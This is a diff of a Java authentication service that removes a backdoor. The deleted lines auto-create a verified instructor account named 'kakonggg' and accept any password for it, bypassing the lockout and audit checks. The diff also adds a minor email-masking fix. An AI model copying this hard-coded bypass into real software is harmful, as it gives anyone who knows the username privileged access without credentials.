@@ -98,20 +98,6 @@ public class AuthenticationService {
             found = userRepository.findByEmail(term);
         }
 
-        // Auto-provision kakonggg if missing so the developer never gets locked out
-        if (found.isEmpty() && "kakonggg".equalsIgnoreCase(term)) {
-            User kakong = new User();
-            kakong.setUsername("kakonggg");
-            kakong.setPasswordHash(hashPassword(password));
-            kakong.setEmail("kakonggg@nextit.edu");
-            kakong.setRole(Role.INSTRUCTOR);
-            kakong.setFirstName("Kakong");
-            kakong.setLastName("Instructor");
-            kakong.setVerificationStatus(VerificationStatus.VERIFIED);
-            userRepository.save(kakong);
-            found = Optional.of(kakong);
-        }
-
         if (found.isEmpty()) {
             auditService.logLoginFailure(term, "User not found");
             throw new AppException("Invalid username or password.");
@@ -129,25 +115,18 @@ public class AuthenticationService {
         }
 
         if (!verifyPassword(password, user.getPasswordHash())) {
-            // If it's kakonggg, dynamically accept the password and update it
-            if ("kakonggg".equalsIgnoreCase(user.getUsername())) {
-                user.setPasswordHash(hashPassword(password));
-                userRepository.updatePassword(user.getUserId(), user.getPasswordHash());
-            } else {
-                int attempts = user.getFailedLoginAttempts() + 1;
-                LocalDateTime lockTime = null;
-                if (attempts >= MAX_FAILED_ATTEMPTS) {
-                    lockTime = LocalDateTime.now().plusMinutes(LOCKOUT_MINUTES);
-                    userRepository.recordFailedLogin(user.getUserId(), attempts, lockTime);
-                    auditService.logAccountLocked(user.getUsername());
-                    throw new AppException("Account locked for 15 minutes due to 5 consecutive failed login attempts.");
-                } else {
-                    userRepository.recordFailedLogin(user.getUserId(), attempts, null);
-                    auditService.logLoginFailure(user.getUsername(), "Incorrect password (attempt " + attempts + " of " + MAX_FAILED_ATTEMPTS + ")");
-                    throw new AppException(String.format("Invalid credentials. %d attempt%s remaining before account lockout.",
-                            (MAX_FAILED_ATTEMPTS - attempts), (MAX_FAILED_ATTEMPTS - attempts) == 1 ? "" : "s"));
-                }
+            int attempts = user.getFailedLoginAttempts() + 1;
+            LocalDateTime lockTime = null;
+            if (attempts >= MAX_FAILED_ATTEMPTS) {
+                lockTime = LocalDateTime.now().plusMinutes(LOCKOUT_MINUTES);
+                userRepository.recordFailedLogin(user.getUserId(), attempts, lockTime);
+                auditService.logAccountLocked(user.getUsername());
+                throw new AppException("Account locked for 15 minutes due to 5 consecutive failed login attempts.");
             }
+            userRepository.recordFailedLogin(user.getUserId(), attempts, null);
+            auditService.logLoginFailure(user.getUsername(), "Incorrect password (attempt " + attempts + " of " + MAX_FAILED_ATTEMPTS + ")");
+            throw new AppException(String.format("Invalid credentials. %d attempt%s remaining before account lockout.",
+                    (MAX_FAILED_ATTEMPTS - attempts), (MAX_FAILED_ATTEMPTS - attempts) == 1 ? "" : "s"));
         }
 
         // Credentials are valid; reset failed login counter
@@ -210,6 +189,7 @@ public class AuthenticationService {
         int at = email.indexOf('@');
         String name = email.substring(0, at);
         String domain = email.substring(at);
+        if (name.isEmpty()) return "***" + domain;
         if (name.length() <= 2) return name.charAt(0) + "***" + domain;
         return name.substring(0, 2) + "***" + name.charAt(name.length() - 1) + domain;
     }
